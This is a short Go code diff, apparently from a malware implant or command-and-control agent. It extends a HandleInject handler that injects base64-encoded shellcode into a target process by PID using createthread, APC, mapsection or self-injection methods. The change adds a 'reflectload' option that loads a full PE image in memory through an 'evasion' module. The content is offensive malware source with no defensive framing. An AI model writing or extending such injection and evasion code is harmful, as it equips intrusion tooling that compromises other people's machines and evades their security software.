@@ -3,12 +3,13 @@
 
 package handlers
 
-// HandleInject injects base64-encoded shellcode into a target process.
+// HandleInject injects base64-encoded shellcode into a target process,
+// or reflectively loads a full PE image.
 //
 // Payload fields:
 //   pid      int     — target process PID (0 = self-inject via NtCreateThread)
-//   data     string  — base64-encoded shellcode
-//   method   string  — "createthread" (default) | "apc" | "self"
+//   data     string  — base64-encoded shellcode or PE blob
+//   method   string  — "createthread" (default) | "apc" | "mapsection" | "self" | "reflectload"
 
 import (
 	"context"
@@ -53,6 +54,8 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 		injectErr = injectAPC(sc, pid)
 	case "mapsection":
 		injectErr = injectMapSection(sc, pid)
+	case "reflectload":
+		injectErr = evasion.ReflectiveLoad(sc)
 	default:
 		injectErr = injectCreateThread(sc, pid)
 	}
